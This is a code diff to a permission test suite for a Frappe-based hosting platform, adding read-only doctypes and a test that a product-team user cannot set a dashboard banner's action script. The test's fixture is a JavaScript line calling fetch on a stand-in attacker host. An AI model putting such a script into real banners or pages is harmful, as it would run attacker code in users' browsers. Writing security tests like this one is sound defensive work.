@@ -51,7 +51,12 @@ SECURITY_READ_ONLY = {
 
 SCOPE_READ_ONLY = {
 	"Agent Job": "sends any request to a server agent",
+	"App Rename": "holds scripts that site updates run on benches",
 	"Press Job Type": "holds step scripts that PressJobStep.execute runs",
+	"Press Workflow": "names the method that its run calls",
+	"Press Workflow Object": "holds pickled values that tasks load",
+	"Press Workflow Task": "names the method and arguments that its run calls",
+	"Press Workflow Test": "runs workflow engine test code",
 }
 
 SSH_DOCTYPES = {"SSH Access Audit", "SSH Certificate", "SSH Key", "User SSH Certificate", "User SSH Key"}
@@ -134,7 +139,9 @@ class TestStaffRoleScopes(FrappeTestCase):
 	def test_scope_roles_only_read_doctypes_that_run_requests_or_scripts(self):
 		ptypes = ("write", "create", "delete", "submit", "cancel", "amend")
 		for doctype in SCOPE_READ_ONLY:
-			for permission in frappe.get_all("DocPerm", {"parent": doctype, "role": ("in", SCOPE_ROLES)}, ["*"]):
+			for permission in frappe.get_all(
+				"DocPerm", {"parent": doctype, "role": ("in", SCOPE_ROLES)}, ["*"]
+			):
 				with self.subTest(doctype=doctype, role=permission.role):
 					self.assertEqual([ptype for ptype in ptypes if permission[ptype]], [])
 
@@ -144,6 +151,21 @@ class TestStaffRoleScopes(FrappeTestCase):
 		job = frappe.get_doc({"doctype": "Agent Job", "request_path": "ping", "request_method": "GET"})
 		with self.assertRaises(frappe.PermissionError):
 			job.insert()
+
+	def test_product_manager_cannot_set_the_dashboard_banner_action_script(self):
+		frappe.set_user(create_staff_user("Press Product Team"))
+		banner = frappe.get_doc(
+			{
+				"doctype": "Dashboard Banner",
+				"title": "Maintenance",
+				"is_global": 1,
+				"has_action": 1,
+				"action_label": "Open",
+				"action_script": "function onClickAction() { fetch('https://attacker.example') }",
+			}
+		).insert()
+		default_script = frappe.get_meta("Dashboard Banner").get_field("action_script").default
+		self.assertEqual(banner.action_script, default_script)
 
 	def test_only_the_ssh_profile_can_create_ssh_certificates_and_keys(self):
 		for profile in PROFILE_SCOPES:
